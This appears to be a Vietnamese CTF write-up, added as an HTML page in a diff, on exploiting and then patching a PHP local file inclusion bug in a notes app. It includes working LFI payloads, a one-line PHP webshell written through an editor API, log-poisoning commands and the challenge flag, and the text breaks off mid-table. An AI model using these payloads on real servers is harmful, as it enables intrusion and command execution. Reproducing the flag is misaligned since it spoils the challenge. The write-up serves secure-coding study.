@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hướng dẫn từng bước — Research Logs (Web / Secure Coding CTF)</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --fg:#e6edf3; --mut:#8b949e;
+          --acc:#58a6ff; --ok:#3fb950; --warn:#d29922; --bad:#f85149; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+         font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; line-height:1.7; }
+  .wrap { max-width:940px; margin:0 auto; padding:32px 20px 90px; }
+  header.hero { border:1px solid var(--border); border-radius:12px; background:linear-gradient(135deg,#161b22,#1a2332);
+                 padding:28px 32px; margin-bottom:28px; }
+  header.hero h1 { margin:0 0 6px; font-size:1.7rem; }
+  header.hero .sub { color:var(--mut); }
+  .flag-box { margin-top:16px; border:1px solid var(--ok); border-radius:10px; background:#12261a; padding:14px 18px; }
+  .flag-box code { color:var(--ok); font-size:1.15rem; font-weight:700; }
+  h2 { color:var(--acc); border-bottom:1px solid var(--border); padding-bottom:8px; margin-top:52px; }
+  h3 { color:var(--fg); margin-top:32px; }
+  h4 { color:var(--acc); margin-top:22px; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:18px 22px; margin:16px 0; }
+  code { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.88em;
+         background:#1c2128; border:1px solid var(--border); border-radius:5px; padding:2px 6px; color:#a5d6ff; }
+  pre { background:#0d1117; border:1px solid var(--border); border-radius:10px; padding:16px; overflow-x:auto;
+        color:#c9d1d9; line-height:1.6; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.87em; }
+  pre code { background:none; border:none; padding:0; color:inherit; }
+  .cm { color:#7ee787; }
+  .kw { color:#ff7b72; }
+  .st { color:#a5d6ff; }
+  .fn { color:#d2a8ff; }
+  table { border-collapse:collapse; width:100%; margin:16px 0; font-size:.92em; }
+  th,td { border:1px solid var(--border); padding:9px 12px; text-align:left; vertical-align:top; }
+  th { background:#1c2128; }
+  .tag { display:inline-block; font-size:.75rem; font-weight:700; border-radius:20px; padding:2px 10px; margin-right:6px; }
+  .tag.ok { background:#12261a; color:var(--ok); border:1px solid var(--ok); }
+  .tag.bad { background:#2d1214; color:var(--bad); border:1px solid var(--bad); }
+  .tag.warn { background:#2a2110; color:var(--warn); border:1px solid var(--warn); }
+  .note { border-left:4px solid var(--warn); background:#211d12; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .tip { border-left:4px solid var(--ok); background:#12261a55; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .verify { border-left:4px solid var(--acc); background:#0d1a2b; padding:12px 16px; border-radius:0 8px 8px 0; margin:16px 0; }
+  .verify b:first-child { color:var(--acc); }
+  .muted { color:var(--mut); }
+  ol.steps > li, ul.dash > li { margin-bottom:8px; }
+  .toc a { color:var(--acc); text-decoration:none; }
+  .toc a:hover { text-decoration:underline; }
+  .spring { border:1px solid #6e7681; border-radius:10px; margin:16px 0; overflow:hidden; }
+  .spring .hd { background:#12324a; padding:8px 16px; font-weight:700; font-size:.9em; color:#79c0ff; }
+  .spring .bd { padding:4px 16px 14px; background:#0d1117; }
+  .spring.bad-ex .hd { background:#3d1d22; color:#ffa198; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <h1>🧪 Research Logs — Vá LFI trong app ghi chú của Rick</h1>
+  <div class="sub">Challenge Web / Secure Coding · HTB Intermediate — NAB Internal CTF · <span class="muted">target: <code>http://&lt;host&gt;:&lt;port&gt;/challenge/</code> (docker spawn riêng)</span></div>
+  <div class="flag-box">
+    🏁 Flag (đã lấy được bằng endpoint <code>/editor_api/verify</code> của challenge, <b>chưa nộp — bạn tự submit</b> ở portal):<br>
+    <code>HTB{pL3as5_1ncLud3_m3!}</code>
+  </div>
+  <div class="card toc" style="margin-top:16px">
+    <b>Mục lục:</b><br>
+    <a href="#p0">Phần 0 — Khái niệm nền</a> ·
+    <a href="#p1">Phần 1 — Recon</a> ·
+    <a href="#p2">Phần 2 — Dead ends</a> ·
+    <a href="#p3">Phần 3 — Đột phá</a> ·
+    <a href="#p4">Phần 4 — Kết liễu</a> ·
+    <a href="#p5">Phần 5 — Root cause (Spring Boot)</a> ·
+    <a href="#p6">Phần 6 — Checklist</a>
+  </div>
+</header>
+
+<p class="muted">Bài viết giả định bạn là lập trình viên Java/Spring Boot, chưa từng khai thác PHP. Mọi khái niệm lạ (LFI, path traversal, <code>include</code>, stream wrapper...) được giải thích ngay khi gặp, và mỗi bước đều có ô "Cách verify".</p>
+
+<!-- ================= PHẦN 0 ================= -->
+<h2 id="p0">Phần 0 — Kiến thức nền cần có trước khi bắt đầu</h2>
+
+<h3>0.1 — LFI (Local File Inclusion): khi <code>include</code> đọc cả file ngoài ý muốn</h3>
+<div class="card">
+<p>Trong PHP, <code>include $x</code> nhúng nội dung file <code>$x</code> vào trang — và <b>thực thi</b> nếu đó là mã PHP. Khi <code>$x</code> đến từ ngưởi dùng mà không kiểm tra, attacker điều khiển được server đọc file nào:</p>
+<pre><code><span class="cm"># Đọc file hệ thống bằng path tuyệt đối</span>
+?note=/etc/passwd
+
+<span class="cm"># Leo thư mục bằng ../ (path traversal)</span>
+?note=../../../../../../etc/passwd
+
+<span class="cm"># Đọc SOURCE PHP qua stream wrapper (bypass render HTML)</span>
+?note=php://filter/convert.base64-encode/resource=notes.php</code></pre>
+<p><b>Tầm nghiêm trọng:</b> đọc config chứa credential, source code, và — như ta sẽ thấy — nếu kết hợp với một cách <b>ghi</b> file nào đó (log, share mạng...), ta có RCE (thực thi lệnh tùy ý).</p>
+</div>
+<div class="verify"><b>✔ Cách verify:</b> phân tích tĩnh. Bước 1.4 sẽ xác nhận: request <code>?note=/etc/passwd</code> trả về nội dung file passwd — khi đó LFI là có thật, không phải lý thuyết.</div>
+
+<h3>0.2 — <code>include</code> vs <code>file_get_contents</code>: ranh giới giữa "xem" và "chạy"</h3>
+<div class="card">
+<table>
+  <tr><th>Hàm</th><th>Hành vi với file PHP</th><th>An toàn khi đường dẫn do user kiểm soát?</th></tr>
+  <tr><td><code>include $path</code></td><td><b>Thực thi</b> mã PHP trong file</td><td>❌ Cực kỳ nguy hiểm — file attacker ghi được sẽ chạy</td></tr>
+  <tr><td><code>file_get_contents($path)</code> + <code>echo</code></td><td>Chỉ <b>đọc chuỗi</b>, in ra text</td><td>⚠️ Vẫn cần chặn path traversal, nhưng không thực thi mã</td></tr>
+</table>
+<p>Bài này có cả hai lớp lỗi: (1) <code>include</code> đường dẫn thô — cho phép đọc + thực thi; (2) chỉ chặn traversal mà vẫn <code>include</code> — vẫn thực thi được webshell nằm trong thư mục cho phép. Bản vá cuối phải sửa <b>cả hai</b>.</p>
+</div>
+<div class="verify"><b>✔ Cách verify:</b> phân tích tĩnh, dùng ở Phần 4 — khi ta đặt webshell <code>x.php</code> vào đúng thư mục cho phép, nó <b>chạy</b> (trả về kết quả <code>id</code>). Đó là bằng chứng <code>include</code> thực thi mã.</div>
+
+<h3>0.3 — Bài dạng "Secure Coding": khai thác trước, vá sau, flag từ bộ kiểm thử</h3>
+<div class="card">
+<p>Challenge này thuộc dạng <b>secure coding</b> của HTB: server cho ta <b>full source code</b> (file zip) và một instance đang chạy đúng source đó. Luồng chuẩn:</p>
+<ol class="steps">
+  <li>Đọc source → tìm lỗ hổng → khai thác trên instance ( chứng minh được RCE ).</li>
+  <li>Vá lỗi trực tiếp trên instance — ở đây có sẵn một <b>web editor</b> (giao diện HTB Editor) với API <code>/editor_api/file</code> (đọc) và <code>/editor_api/save</code> (ghi).</li>
+  <li>Gọi <code>GET /editor_api/verify</code> — bộ kiểm thử tự động chạy hai nhánh: <b>vulnerability check</b> (các payload LFI phải bị chặn) và <b>functionality check</b> (ngưởi dùng hợp lệ vẫn xem được ghi chú). Cả hai đều đúng → trả về flag.</li>
+</ol>
+<p>Đề bài còn kèm <code>note.md</code> hướng dẫn mount <b>SMB share</b> để sửa file — vì bản gốc challenge mở cổng 445. Trên instance của event này chỉ map ra 1 cổng HTTP (editor), nên ta dùng editor API làm phương tiện ghi file tương đương.</p>
+</div>
+<div class="verify"><b>✔ Cách verify:</b> sau khi spawn instance (bước 1.2), gọi <code>GET /editor_api/directory</code> — trả về cây thư mục app là bằng chứng editor gắn với đúng instance.</div>
+
+<h3>0.4 — Công cụ và các cờ dùng xuyên suốt bài</h3>
+<div class="card">
+<table>
+  <tr><th>Lệnh / cờ</th><th>Ý nghĩa</th><th>Tại sao dùng ở đây</th></tr>
+  <tr><td><code>curl -s -o /dev/null -w '%{http_code}'</code></td><td><code>-s</code>: im lặng; <code>-w</code>: in status code ra stdout</td><td>Kiểm tra nhanh "bị chặn = 302, hợp lệ = 200" cho từng payload.</td></tr>
+  <tr><td><code>curl --data 'cmd=...'</code></td><td>Gửi POST form (<code>application/x-www-form-urlencoded</code>)</td><td>Truyền lệnh cho webshell <code>system($_POST["cmd"])</code>.</td></tr>
+  <tr><td><code>sed -n '/&lt;pre/,/&lt;\/pre&gt;/p'</code></td><td>Cắt phần nội dung nằm trong thẻ <code>&lt;pre&gt;</code></td><td>Response luôn bọc kết quả include trong <code>&lt;pre&gt;</code> — cắt đúng chỗ đó để lấy output sạch.</td></tr>
+  <tr><td><code>realpath()</code> (PHP)</td><td>Trả về đường dẫn tuyệt đối đã resolve symlink + <code>..</code></td><td>Nền tảng của bản vá: so sánh path đã chuẩn hoá với thư mục gốc.</td></tr>
+</table>
+</div>
+
+<!-- ================= PHẦN 1 ================= -->
+<h2 id="p1">Phần 1 — Recon: đọc source trước, chạm instance sau</h2>
+<p class="muted">Dạng secure coding cho sẵn source — kẻ tấn công lường trước được mọi thứ. Ta đọc kỹ source trước khi gửi một request nào.</p>
+
+<h3>Bước 1.1 — Tải và đọc source, note.md</h3>
+<pre><code><span class="cm"># Tải file zip từ portal (link qua /api/challenges/77878/download/link) rồi giải nén</span>
+unzip -o -q research_logs.zip -d src
+cat src/ricks_research_log/note.md</code></pre>
+<pre><code>One of the ports is a SMB share that you must mount on your host to make direct changes.</code></pre>
+<p>Đây là gợi ý phương tiện sửa file: SMB share map thẳng vào thư mục app. (Trên instance event này ta sẽ dùng editor API thay thế — xem bước 1.3.)</p>
+<div class="verify"><b>✔ Cách verify:</b> <code>find src -name '*.php'</code> phải liệt kê được <code>index.php</code>, <code>notes.php</code>, <code>rm_notes.php</code>, <code>my_notes.php</code>, <code>load_files.php</code>, <code>navbar.php</code>.</div>
+
+<h3>Bước 1.2 — Đọc <code>notes.php</code>: tìm điểm gộp đường dẫn</h3>
+<pre><code><span class="cm"># File quan trọng nhất — nơi hiển thị một ghi chú</span>
+cat src/ricks_research_log/challenge/app/notes.php</code></pre>
+<pre><code>&lt;pre class=<span class="st">"wrapped-text"</span>&gt;
+&lt;?php <span class="kw">include</span> $selectedNote; ?&gt;   <span class="cm"># ← $selectedNote = $_GET['note'], KHÔNG hề kiểm tra</span>
+&lt;/pre&gt;</code></pre>
+<p><b>Lỗ hổng xác định:</b> LFI thuần tuý. Ta điều khiển hoàn toàn file được <code>include</code> — đọc được mọi file readable, và nếu file chứa mã PHP thì <b>thực thi</b> (mục 0.2).</p>
+<div class="verify"><b>✔ Cách verify:</b> phân tích tĩnh — ghi nhớ dòng <code>include $selectedNote</code>. Ở bước 1.5 ta sẽ chứng minh bằng request thật.</div>
+
+<h3>Bước 1.3 — Spawn instance, xác định bề mặt tấn công</h3>
+<p>Spawn docker từ portal (hoặc API). Sau khi instance lên, lưu ý quan trọng: <b>root URL của port map không phải app</b> — nó là giao diện HTB Editor. App thật nằm ở path <code>/challenge/</code>:</p>
+<pre><code><span class="cm"># Root trả về SPA "HTB Editor" — đừng hoang mang, app nằm dưới /challenge/</span>
+curl -s http://&lt;host&gt;:&lt;port&gt;/ | grep -o '&lt;title&gt;[^&lt;]*&lt;/title&gt;'     <span class="cm"># → &lt;title&gt;HTB Editor&lt;/title&gt;</span>
+curl -s http://&lt;host&gt;:&lt;port&gt;/challenge/ | grep -o '&lt;title&gt;[^&lt;]*&lt;/title&gt;' <span class="cm"># → &lt;title&gt;Rick's Research Log&lt;/title&gt; ✅</span></code></pre>
+<p>Đồng thờii, thăm dò API của editor (đọc từ JS bundle của editor):</p>
+<pre><code>curl -s http://&lt;host&gt;:&lt;port&gt;/editor_api/directory</code></pre>
+<pre><code>{"css":{...},"index.php":{"type":"file"},"load_files.php":{...},"my_notes":{"children":{},"type":"folder"},
+ "navbar.php":{...},"notes.php":{...},"rick_and_morty_notes":{"children":{},"type":"folder"},"rm_notes.php":{...}}</code></pre>
+<div class="verify"><b>✔ Cách verify:</b> hai dấu hiệu bắt buộc: (1) <code>/challenge/</code> có title "Rick's Research Log"; (2) <code>/editor_api/directory</code> trả JSON cây thư mục app. Thiếu một trong hai nghĩa là bạn đang nhìn nhầm endpoint.</div>
+
+<h3>Bước 1.4 — Kiểm chứng LFI trên instance thật</h3>
+<pre><code><span class="cm"># Payload kinh điển — đọc /etc/passwd qua include</span>
+curl -s <span class="st">'http://&lt;host&gt;:&lt;port&gt;/challenge/notes.php?note=/etc/passwd'</span> | grep -E <span class="st">'root:|www-data'</span></code></pre>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</code></pre>
+<p>LFI xác nhận — server đọc và in file hệ thống. Từ đây có 2 hướng: (a) đọc tìm flag trực tiếp, (b) nâng lên RCE để tìm flag và chứng minh mức độ nghiêm trọng.</p>
+<div class="verify"><b>✔ Cách verify:</b> output phải chứa dòng <code>root:x:0:0:...</code>. Đây là so sánh với kiến thức nền ở mục 0.1 — lý thuyết khớp thực tế.</div>
+
+<h3>Bước 1.5 — Lên RCE bằng webshell viết qua editor API</h3>
+<p>Đây là bước chứng minh đẳng cấp thật của lỗi: editor API cho <b>ghi file vào đúng thư mục app</b> — tương đương quyền ghi qua SMB trong note.md. Viết webshell rồi include nó:</p>
+<pre><code><span class="cm"># Ghi webshell — POST JSON tới editor API (file mới: client_md5 đặt gì cũng được)</span>
+curl -s -X POST <span class="st">'http://&lt;host&gt;:&lt;port&gt;/editor_api/save'</span> \
+  -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"path":"my_notes/x.php","content":"&lt;?php system($_POST[\"cmd\"]); ?&gt;","client_md5":"x"}'</span></code></pre>
+<pre><code>{"md5":"26fd0a25486fffc9292cc603720ff3ec","message":"File saved successfully"}</code></pre>
+<pre><code><span class="cm"># Include webshell — ta đang chạy lệnh với quyền PHP-FPM</span>
+curl -s <span class="st">'http://&lt;host&gt;:&lt;port&gt;/challenge/notes.php?note=my_notes/x.php'</span> --data <span class="st">'cmd=id'</span> \
+  | sed -n <span class="st">'/&lt;pre/,/&lt;\/pre&gt;/p'</span></code></pre>
+<pre><code>uid=100(challenger) gid=1000(challenger) groups=1000(challenger)</code></pre>
+<p>RCE hoàn chỉnh. Giờ ta có thể tìm flag bằng <code>find / -name 'flag*'</code>... nhưng sẽ không thấy — lý do và hướng đi đúng ở Phần 2, 3.</p>
+<div class="verify"><b>✔ Cách verify:</b> output phải in dòng <code>uid=100(challenger) ...</code> — so với mục 0.2: <code>include</code> đã <b>thực thi</b> <code>system()</code> trong file ta ghi.</div>
+
+<!-- ================= PHẦN 2 ================= -->
+<h2 id="p2">Phần 2 — Các hướng trực diện (thất bại, và cách verify)</h2>
+<p class="muted">Bốn hướng sau đều hợp lý khi mới nhìn, và đều chết có bằng chứng. Ghi lại để bạn khỏi mất thởi gian đi lại.</p>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.1 — Đọc flag trực tiếp qua LFI ở các đường dẫn quen thuộc</h3>
+<p><b>Thao tác:</b> với RCE + LFI, thử đọc flag ở mọi vị trí thông dụng:</p>
+<pre><code><span class="kw">for</span> p <span class="kw">in</span> /flag /flag.txt /root/flag /root/flag.txt /www/flag /www/flag.txt /var/flag /var/www/flag.txt; <span class="kw">do</span>
+  curl -s <span class="st">"$T/challenge/notes.php?note=$p"</span> | grep -oE <span class="st">'HTB\{[^}]*\}'</span> &amp;&amp; <span class="kw">echo</span> <span class="st">"FOUND at $p"</span>
+<span class="kw">done</span>
+<span class="cm"># (và qua RCE) find / -name "flag*" 2&gt;/dev/null → chỉ toàn file flags của kernel, không có flag thật</span></code></pre>
+<p><b>Kết quả thật:</b> không vị trí nào có flag.</p>
+<p><b>Kết luận:</b> flag không nằm sẵn trên filesystem — nó do <b>bộ kiểm thử của challenge cấp</b> sau khi vá đúng (mục 0.3). Buộc phải đi đường "vá rồi verify".</p>
+<div class="verify"><b>✔ Cách verify:</b> với RCE, <code>find / -name 'flag*'</code> chỉ trả về <code>/sys/devices/.../flags</code> (thông tin kernel) và <code>.../dns/flags.py</code> (thư viện Python) — không có file flag nào của challenge. Kết luận "không có flag tĩnh" là đúng.</div>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.2 — Log poisoning: chèn PHP vào User-Agent rồi include access.log</h3>
+<p><b>Thao tác:</b> theo gợi ý của <code>exploit.py</code> trong source — đầu độc log nginx bằng payload trong User-Agent, rồi include log:</p>
+<pre><code>curl -s -A <span class="st">'&lt;?php system($_POST["cmd"]); ?&gt;'</span> <span class="st">"$T/challenge/"</span> -o /dev/null
+curl -s <span class="st">"$T/challenge/notes.php?note=/var/log/nginx/access.log"</span> --data <span class="st">'cmd=id'</span> | sed -n <span class="st">'/&lt;pre/,/&lt;\/pre&gt;/p'</span>
+<span class="cm"># → &lt;pre&gt; trống không</span></code></pre>
+<p><b>Kết quả thật:</b> include access.log ra trang trắng; kể cả đọc thường (không POST) cũng không thấy dòng log nào.</p>
+<p><b>Kết luận:</b> bản deploy runtime không ghi access.log ra file (nhiều khả năng redirect sang stdout của container — cấu hình deploy khác source zip). Đường log poisoning tắt. Đây là bài học: <b>source zip mô tả bản gốc, không phải bản deploy</b>.</p>
+<div class="verify"><b>✔ Cách verify:</b> include <code>/var/log/nginx/access.log</code> và <code>error.log</code> đều trả về <code>&lt;pre&gt;</code> rỗng, trong khi include <code>/etc/hostname</code> vẫn in được tên pod → LFI hoạt động, chỉ riêng log file rỗng/không tồn tại.</div>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.3 — Đọc source PHP bằng stream wrapper <code>php://filter</code></h3>
+<p><b>Thao tác:</b></p>
+<pre><code>curl -s <span class="st">"$T/challenge/notes.php?note=php://filter/convert.base64-encode/resource=index.php"</span> | grep -oE <span class="st">'[A-Za-z0-9+/]{40,}={0,2}'</span></code></pre>
+<p><b>Kết quả thật:</b> không ra base64 nào — wrapper không hoạt động (trên PHP mặc định, <code>include</code> với wrapper yêu cầu <code>allow_url_include=On</code>, thường bị tắt).</p>
+<p><b>Kết luận:</b> wrapper đường dài bị chặn. Không sao — editor API (bước 1.5) đọc source tốt hơn wrapper nhiều.</p>
+<div class="verify"><b>✔ Cách verify:</b> so sánh — cùng một request dạng nhưng với <code>note=/etc/passwd</code> (file thật) thì có output, còn wrapper thì trắng → khác biệt nằm ở wrapper, không phải ở LFI.</div>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.4 — Ba lần vá sai (đọc để khỏi tái phạm)</h3>
+<p><b>Thao tác &amp; kết quả thật:</b></p>
+<table>
+  <tr><th>Bản vá</th><th>Kết quả verify</th><th>Nguyên nhân</th></tr>
+  <tr><td>v1: whitelist <code>scandir('/www/app/...')</code></td><td>"Application functionality check failed"</td><td>Runtime không có <code>/www/app</code> — docroot thực là <code>/app/main_app</code> (xác nhận ở bước 3.1) → whitelist rỗng → chặn luôn cả ghi chú hợp lệ.</td></tr>
+  <tr><td>v2/v3: <code>realpath('/www/app')</code>, so sánh prefix</td><td>Vẫn fail</td><td>Hardcode đường dẫn tuyệt đối từ source zip — sai lệch với deploy.</td></tr>
+  <tr><td>v4: tái cấu trúc file bằng cắt chuỗi <code>original[index('?&gt;'):]</code></td><td>Trang note trắng</td><td>File lưu xuống chỉ còn 416 byte — mất toàn bộ HTML. Bài học: tái cấu trúc file qua chuỗi dễ vỡ; phải xây từ file gốc có sẵn.</td></tr>
+  <tr><td>v5: <code>realpath(__DIR__)</code> + giới hạn 2 thư mục, vẫn <code>include</code></td><td>"Vulnerability check failed"</td><td>Chặn được /etc/passwd nhưng <b>vẫn include</b> → file PHP do attacker ghi vào thư mục cho phép vẫn thực thi được. Checker bắt đúng điểm này.</td></tr>
+  <tr><td>v6: thêm giới hạn đuôi <code>.md</code> + <code>htmlspecialchars</code></td><td>"Application functionality check failed"</td><td>Vulnerability check đã qua, nhưng functionality lại fail — render khác bản gốc (encode HTML entity).</td></tr>
+</table>
+<p><b>Kết luận chung:</b> vá an toàn phải thỏa 3 điều kiện <b>đồng thờii</b>: (1) chặn mọi path ngoài 2 thư mục ghi chú — dùng <code>realpath</code> so với <code>__DIR__</code>, không hardcode đường dẫn; (2) không thực thi mã — đọc bằng <code>file_get_contents</code> thay <code>include</code>; (3) giữ nguyên hành vi hiển thị cho file hợp lệ.</p>
+<div class="verify"><b>✔ Cách verify:</b> mỗi lần verify trả về một trong hai lỗi rõ ràng — <code>"Vulnerability check failed — the security issue has not been resolved"</code> (còn lỗ hổng) hoặc <code>"Application functionality check failed"</code> (hỏng chức năng). Hai lỗi chỉ tách bạch được khi vá đúng cả hai mặt.</div>
+
+<!-- ================= PHẦN 3 ================= -->
+<h2 id="p3">Phần 3 — Đột phá: nhìn đúng bản deploy và viết đúng bản vá</h2>
+
+<h3>Bước 3.1 — Probe: thư mục thực của PHP là gì?</h3>
+<p>Sau 3 lần vá hỏng vì giả định sai về filesystem, ta cần <b>dữ kiện thật</b>. Viết một file probe qua editor API rồi chạy nó:</p>
+<pre><code>curl -s -X POST <span class="st">'http://&lt;host&gt;:&lt;port&gt;/editor_api/save'</span> -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"path":"probe.php","content":"&lt;?php echo getcwd(),\"\\n\",realpath(\u0027/www/app\u0027),\"\\n\";" ,"client_md5":"x"}'</span>
+curl -s <span class="st">'http://&lt;host&gt;:&lt;port&gt;/challenge/probe.php'</span></code></pre>
+<pre><code>DOCROOT=/app/main_app        <span class="cm"># ← docroot thực của PHP</span>
+RP=                          <span class="cm"># ← realpath('/www/app') = false: đường dẫn trong source zip KHÔNG tồn tại</span></code></pre>
+<p>Đây là chìa khoá toàn bài: <b>deploy layout ≠ source zip</b>. Mọi hardcode <code>/www/app</code> đều vô nghĩa. Hằng số <code>__DIR__</code> (thư mục chứa chính file đang chạy) là mỏ neo duy nhất đáng tin.</p>
+<div class="verify"><b>✔ Cách verify:</b> probe phải in <code>DOCROOT=/app/main_app</code> và <code>RP=</code> rỗng. Hai giá trị này giải thích hoàn hảo v1/v2/v3 ở bảng 2.4 — nếu docroot của bạn khác, hãy tin giá trị bạn đo được, không tin source zip.</div>
+
+<h3>Bước 3.2 — Bản vá hoàn chỉnh (v7)</h3>
+<p>Xây lại <code>notes.php</code> từ file gốc trong source zip (giữ nguyên 100% HTML), chỉ thay phần PHP đầu file:</p>
+<pre><code><span class="kw">&lt;?php</span>
+$selectedNote = isset($_GET[<span class="st">'note'</span>]) ? $_GET[<span class="st">'note'</span>] : <span class="kw">null</span>;
+
+<span class="cm">// 1) Chong LFI: path phai resolve thuc te nam trong 2 thu muc ghi chu cho phep</span>
+$base = realpath(<span class="kw">__DIR__</span>);
+$real = ($selectedNote !== <span class="kw">null</span>) ? realpath(<span class="kw">__DIR__</span> . <span class="st">'/'</span> . $selectedNote) : <span class="kw">false</span>;
+
+$allowedDirs = <span class="fn">array</span>($base . <span class="st">'/rick_and_morty_notes/'</span>, $base . <span class="st">'/my_notes/'</span>);
+$ok = <span class="kw">false</span>;
+<span class="kw">if</span> ($real !== <span class="kw">false</span> &amp;&amp; <span class="fn">is_file</span>($real)) {
+    <span class="kw">foreach</span> ($allowedDirs <span class="kw">as</span> $dir) {
+        <span class="kw">if</span> (<span class="fn">strpos</span>($real, $dir) === 0) { $ok = <span class="kw">true</span>; <span class="kw">break</span>; }
+    }
+}
+
+<span class="kw">if</span> (!$ok) {
+    <span class="fn">header</span>(<span class="st">"Location: /challenge/index.php"</span>);
+    <span class="kw">exit</span>;
+}
+
+<span class="cm">// 2) Doc noi dung dang text - khong include =&gt; khong thuc thi duoc ma PHP</span>
+$noteContent = <span class="fn">file_get_contents</span>($real);
+<span class="kw">?&gt;</span>
+<span class="cm">... (HTML giu nguyen, chi thay dong include bang:)</span>
+<span class="kw">&lt;?php</span> <span class="kw">echo</span> $noteContent; <span class="kw">?&gt;</span></code></pre>
+<p>Điểm khác với mọi bản vá trước:</p>
+<ul class="dash">
+  <li><code>__DIR__</code> thay <code>'/www/app'</code> — không phụ thuộc layout deploy.</li>
+  <li>Hai điều kiện prefix (2 thư mục riêng biệt, kèm dấu <code>/</code> cuối) chặn cả <code>my_notes_evil/</code> lẫn <code>my_notes/../x</code>.</li>
+  <li><code>file_get_contents</code> + <code>echo</code> thay <code>include</code> — file PHP đặt vào đây cũng chỉ bị <b>hiển thị dạng text</b>, không bao giờ chạy.</li>
+  <li>Không giới hạn đuôi file — chức năng gốc (xem mọi file trong 2 thư mục ghi chú) được bảo toàn.</li>
+</ul>
+<div class="verify"><b>✔ Cách verify:</b> phân tích tĩnh — tự hỏi trước khi lưu: (a) <code>?note=/etc/passwd</code> → realpath ra ngoài base → bị 302? (b) <code>?note=my_notes/../my_notes/x.php</code> → resolve vào trong → được, nhưng <b>chỉ hiển thị text</b>, không chạy <code>system()</code>? (c) ghi chú hợp lệ vẫn 200? Cả ba sẽ được kiểm chứng ở Phần 4.</div>
+
+<!-- ================= PHẦN 4 ================= -->
+<h2 id="p4">Phần 4 — Kết liễu: lưu vá (đúng optimistic locking) và verify</h2>
+
+<h3>Bước 4.1 — Lưu file qua editor API: chú ý <code>client_md5</code></h3>
+<p>Endpoint <code>/editor_api/save</code> dùng optimistic locking: <code>client_md5</code> phải là md5 của nội dung <b>hiện tại</b> trên server. Sai → <code>409 CONFLICT</code>:</p>
+<pre><code><span class="cm"># Lan dau luu thu: 409 vi dung md5 gia</span>
+curl -s -X POST <span class="st">'.../editor_api/save'</span> -d <span class="st">'{"path":"notes.php","content":"...","client_md5":"x"}'</span>
+<span class="cm"># → 409 CONFLICT</span>
+
+<span class="cm"># Dung cach: doc file hien tai, tinh md5 roi moi save</span>
+cur=$(curl -s <span class="st">'.../editor_api/file?path=notes.php'</span>)
+md5=$(printf <span class="st">'%s'</span> <span class="st">"$cur"</span> | md5)
+curl -s -X POST <span class="st">'.../editor_api/save'</span> -d <span class="st">'{"path":"notes.php","content":"&lt;NOI DUNG V7&gt;","client_md5":"'$md5'"}'</span>
+<span class="cm"># → {"message":"File saved successfully"}</span></code></pre>
+<div class="verify"><b>✔ Cách verify:</b> response phải là JSON có <code>"message":"File saved successfully"</code>. Sau đó đọc lại bằng <code>/editor_api/file?path=notes.php</code> — nội dung phải có đủ cả guard mới lẫn HTML gốc (độ dài ~1.7 KB, có chuỗi <code>&lt;!DOCTYPE html&gt;</code>).</div>
+
+<h3>Bước 4.2 — Kiểm chứng 3 tình huống trước khi verify</h3>
+<pre><code>T=<span class="st">'http://&lt;host&gt;:&lt;port&gt;'</span>
+<span class="cm"># (a) Ghi chu hop le van xem duoc</span>
+curl -s <span class="st">"$T/challenge/notes.php?note=rick_and_morty_notes/pickle_rick_incident.md"</span> | sed -n <span class="st">'/&lt;pre/,/&lt;\/pre&gt;/p'</span> | head -2
+<span class="cm"># → "# Dimension C-137 – "Pickle Rick Incident"" ✅</span>
+
+<span class="cm"># (b) LFI bi chan</span>
+curl -s -o /dev/null -w <span class="st">'%{http_code}\n'</span> <span class="st">"$T/challenge/notes.php?note=/etc/passwd"</span>          <span class="cm"># → 302 ✅</span>
+curl -s -o /dev/null -w <span class="st">'%{http_code}\n'</span> <span class="st">"$T/challenge/notes.php?note=../../../../../../etc/passwd"</span> <span class="cm"># → 302 ✅</span>
+curl -s -o /dev/null -w <span class="st">'%{http_code}\n'</span> <span class="st">"$T/challenge/notes.php?note=php://filter/convert.base64-encode/resource=notes.php"</span> <span class="cm"># → 302 ✅</span>
+
+<span class="cm"># (c) File PHP trong thu muc cho phep KHONG con thuc thi</span>
+curl -s <span class="st">"$T/challenge/notes.php?note=my_notes/x.php"</span> --data <span class="st">'cmd=id'</span> | sed -n <span class="st">'/&lt;pre/,/&lt;\/pre&gt;/p'</span>
+<span class="cm"># → chi hien ma nguon text "&lt;?php system(...)", khong co output cua id ✅</span></code></pre>
+<div class="verify"><b>✔ Cách verify:</b> cả 3 phải đúng như kỳ vọng. Riêng (c) là khác biệt quyết định so với v5 — so với bước 1.5: cùng một request nhưng lần này <b>không</b> in <code>uid=100(...)</code>.</div>
+
+<h3>Bước 4.3 — Gọi verify, nhận flag</h3>
+<pre><code>curl -s <span class="st">'http://&lt;host&gt;:&lt;port&gt;/editor_api/verify'</span></code></pre>
+<pre><code>{<span class="st">"flag"</span>:<span class="st">"HTB{pL3as5_1ncLud3_m3!}"</span>}</code></pre>
+<div class="tip"><b>🎯 Flag:</b> <code>HTB{pL3as5_1ncLud3_m3!}</code> — tên flag nhắc đúng trọng tâm: vấn đề nằm ở <code>include</code>. Còn nhớ lần verify trước (v5) bị "Vulnerability check failed" — lần này qua, vì ta đã bỏ <code>include</code> hẳn.</div>
+
+<h3>Bảng tổng kết chuỗi tấn công</h3>
+<table>
